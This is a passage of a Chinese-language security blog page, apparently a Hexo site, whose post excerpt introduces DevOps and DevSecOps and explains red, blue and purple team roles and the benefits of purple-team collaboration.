<li>Rumble 快速、简单、准确的资产可见性</li>
</ul>
<h3 id="搜素引擎"><a href="#搜素引擎" class="headerlink" title="搜素引擎"></a>搜素引擎</h3><ul>
<li>Censys</li>
</ul>
<h3 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h3><ul>
<li>日志收集（云和本地）</li>
<li>网络分接头（cpacket）</li>
<li>编排与自动化（ThreatNexus）</li>
<li>SSL解密 （F5 SSL）</li>
<li>第三方威胁情报（confense PhishME）</li>
</ul>
<h1 id="Devops-and-DevSecops"><a href="#Devops-and-DevSecops" class="headerlink" title="Devops and DevSecops"></a>Devops and DevSecops</h1><p>DevOps（“开发”和“运营”的组合）是实践和工具的组合，旨在提高组织比传统软件开发流程更快地交付应用程序和服务的能力。这种速度使组织能够更好地为客户服务并在市场上更有效地竞争。简单来说，DevOps 就是要消除传统上孤立的团队、开发和运营之间的障碍。在 DevOps 模型下，开发和运营团队在整个软件应用程序生命周期中协同工作，从开发和测试到部署再到运营。</p>
<p>DevOps 安全，通常称为 DevSecOps，是指通过策略、策略、流程和技术来保护整个 DevOps 环境的纪律和实践。DevSecOps 理念是，安全性应该构建到 DevOps 生命周期的每个部分，包括启动、设计、构建、测试、发布、支持、维护等。传统的安全从这样的立场出发，即一旦设计了系统，就可以在发布之前确定和纠正其安全缺陷。随着 DevOps 模型的变化，传统的安全实践在开发周期中出现得太晚，并且对于迭代构建的软件的设计和发布来说太慢了。因此，它们可能成为快速交付应用程序和服务的主要障碍。</p>
<h1 id="Devops-and-DevSecops-value"><a href="#Devops-and-DevSecops-value" class="headerlink" title="Devops and DevSecops value"></a>Devops and DevSecops value</h1><p>借助 DevSecOps，安全成为 DevOps 团队中每个人的关注焦点。DevSecOps 的目标是在不牺牲安全性的情况下快速、大规模地实施安全决策。DevSecOps 涉及发布工程师和安全团队之间持续、灵活的协作。“交付速度”和“构建安全代码”的概念合并为一个简化的流程。安全测试是在迭代中完成的，不会减慢交付周期。关键的安全问题会在它们变得明显时进行处理，而不是在威胁或危害发生后进行处理。</p>
<h2 id="Red-Blue-Purple"><a href="#Red-Blue-Purple" class="headerlink" title="Red  Blue  Purple"></a>Red  Blue  Purple</h2><ul>
<li>红队</li>
</ul>
<p>红队进行滲透测试和漏洞评估，常见任务：</p>
<ol>
<li>滲透测试</li>
<li>漏洞评估</li>
<li>社会工程学</li>
</ol>
<ul>
<li>蓝队</li>
</ul>
<p>构建和维护组织防御的同时响应事件，常见任务；</p>
<ol>
<li>风险情报数据分析</li>
<li>事件响应</li>
<li>安全监控</li>
<li>逆向工程</li>
</ol>
<ul>
<li>紫队</li>
</ul>
<p>紫色团队被设计为红色和蓝色团队之间的反馈桥梁，将他们的方法修改为更主动、更直接，最终在组织的整体安全态势方面更有效<br>红队建议如何优先考虑漏洞管理和修补关键缺陷，而蓝队则监控红队，并分享对红队活动和测试的见解，以发现系统中更深层次的弱点</p>
<h1 id="它如何从紫色团队中受益"><a href="#它如何从紫色团队中受益" class="headerlink" title="它如何从紫色团队中受益"></a>它如何从紫色团队中受益</h1><ul>
<li>更有效漏洞检测</li>
</ul>
<p>有时攻击者绕过所有防御可能会发生破坏，而蓝队甚至没有注意到它的发生。这并不一定表明蓝队缺乏技能或技术，而是攻击者技术的复杂性或攻击向量的复杂性，紫队的存在就是为了消除这种可能性。红色和蓝色团队一起工作意味着参与不断的知识转移和模拟现实生活中的攻击场景。这样，红队将加强组织的漏洞管理流程，而蓝队将进入攻击者的思维模式，以开发更好的事件响应程序和漏洞检测流程。</p>
<ul>
<li>更健康网络安全文化</li>
</ul>
<p>正如我们之前所说，红队和蓝队的目标都是改善组织的安全防御，就像组织的目标是培养健康的公司网络安全文化一样。紫色组队，第一个激励很强，攻防之间经常沟通，信息源源不断，工作共生。同样，紫色团队不一定是新组建的团队，它可以作为两个现有团队之间的练习。重要的是鼓励团队成员之间的沟通和协作，以促进组织网络安全文化的不断改进。</p>
<ul>
<li>更好安全态势</li>
</ul>
<p>如果没有紫色团队的持续沟通、定期安全审计、新防御技术、威胁追踪、漏洞管理以及改进安全基础设施和策略的开发，组织将无法抵御恶意行为者。</p>
<h1 id="它在实践中需要注意"><a href="#它在实践中需要注意" class="headerlink" title="它在实践中需要注意"></a>它在实践中需要注意</h1><ol>
<li><p>协作和沟通是关键，虽然两个团队分享他们的发现并互相帮助很重要，但你永远不应该期望红队参与完整的漏洞管理过程，也不要让蓝队作为专家黑客负责。</p>
</li>
<li><p>您是否正在致力于改进安全警报或安全策略和流程？您是否正在验证您的员工能够在多大程度上保护自己免受社会工程的侵害？</p>
</li>
<li><p>在渗透测试、安全审计或漏洞评估期间是否发生了您想要纠正或修改的任何事情？</p>
</li>
<li><p>在实施这些安全补救措施之前，请进行修改和验证。更好的是，跟踪每一步，在进行下一步之前评估每一项任务，并始终跟进。</p>
</li>
<li><p>反复检查每一个缓解和修复将允许双方相互学习更多，帮助缩小任何差距，并允许优先的补救指导方针。这将关注重复性弱点较少的红队，并引导蓝队寻找更复杂的威胁。</p>
</li>
</ol>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/11/deveops/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/josyaaa/page/2/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/josyaaa/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
		
			

		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/josyaaa/2022/05/30/ids/" ><i class="fa fa-file-o"></i>IDS 逻辑和规则</a>
      </li>
    
      <li>
        <a href="/josyaaa/2022/05/29/cloud attack/" ><i class="fa fa-file-o"></i>云基础设施攻击方式逻辑</a>
      </li>
    
      <li>
        <a href="/josyaaa/2022/05/22/eternalbule/" ><i class="fa fa-file-o"></i>forget a msfconsole using</a>
      </li>
    
      <li>
        <a href="/josyaaa/2022/05/22/how to data set/" ><i class="fa fa-file-o"></i>trade and attack tree</a>
      </li>
    
      <li>
        <a href="/josyaaa/2022/05/15/assign/" ><i class="fa fa-file-o"></i>大型软件架构逻辑框架</a>
      </li>
    
  </ul>
</div>

		
			

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2022 josyaaa
  
      when meets RED to BLUE ...<a href="https://josyaaa.github.io/" target="_blank">josyaaa's blog</a>,<a href="https://github.com/josyaaa?tab=repositories">josyaaa's github</a><a href="http://getbootstrap.com/" target="_blank"></a><a href="http://getbootstrap.com/" target="_blank"></a>.
     <br> SCDAD/BIG DATA/MALWARE <a href="http://github.com/wzpan/hexo-theme-freemind/"></a> most good at leading tech
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/josyaaa/js/jquery.imagesloaded.min.js"></script>
<script src="/josyaaa/js/gallery.js"></script>
<script src="/josyaaa/js/bootstrap.min.js"></script>
<script src="/josyaaa/js/main.js"></script>
<script src="/josyaaa/js/search.js"></script> 


<link rel="stylesheet" href="/josyaaa/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/josyaaa/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/josyaaa/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
